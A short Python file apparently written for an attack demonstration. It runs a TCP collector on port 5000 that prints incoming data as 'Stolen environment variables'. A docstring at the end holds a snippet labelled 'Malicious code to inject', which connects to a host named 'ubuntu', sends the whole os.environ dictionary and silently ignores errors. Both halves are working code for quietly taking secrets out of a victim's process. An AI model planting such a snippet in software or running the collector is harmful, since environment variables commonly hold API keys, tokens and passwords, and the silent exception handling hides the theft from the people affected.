import socket

ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ns.bind(("", 5000))
ns.listen()

while True:
    print("Awaiting connection")
    connection, ip_address = ns.accept()
    with connection:
        environment_variables_bytes = connection.recv(4096)
        if environment_variables_bytes:
            environment_variables = environment_variables_bytes.decode("utf-8")
            print(f'({ip_address}) Stolen environment variables: {environment_variables}')
        else:
            print(f'({ip_address}) Did not receive any environment variables')

"""
# Malicious code to inject.
try:
    ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ns.connect(("ubuntu", 5000))
    ns.sendall(bytes(str(os.environ), "utf-8"))
except:
    pass
"""